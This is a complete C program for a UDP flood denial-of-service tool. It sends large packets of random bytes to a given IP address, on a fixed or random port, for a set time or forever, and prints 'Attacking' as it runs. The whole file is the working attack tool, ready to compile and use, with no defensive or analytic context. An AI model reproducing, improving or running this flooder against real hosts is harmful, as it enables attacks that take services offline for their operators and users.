#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define PACKET_SIZE 25000

void udp_flood(const char *ip, int port, int duration) {
    bool random_port = (port == 0);

    printf("Attacking: %s:%d for %d seconds\n", ip, port, duration);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Error creating socket");
        exit(1);
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(ip);

    unsigned char bytes[PACKET_SIZE];
    for (int i = 0; i < PACKET_SIZE; ++i) {
        bytes[i] = rand() % 256;
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    while (true) {
        if (random_port) {
            port = rand() % 15000000 + 1;
        }
        dest_addr.sin_port = htons(port);

        sendto(sock, bytes, PACKET_SIZE, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (duration > 0 && time(NULL) >= end_time) {
            break;
        }
    }

    printf("DONE\n");
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s ip port(0=random) duration(0=forever)\n", argv[0]);
        exit(1);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    udp_flood(ip, port, duration);

    return 0;
}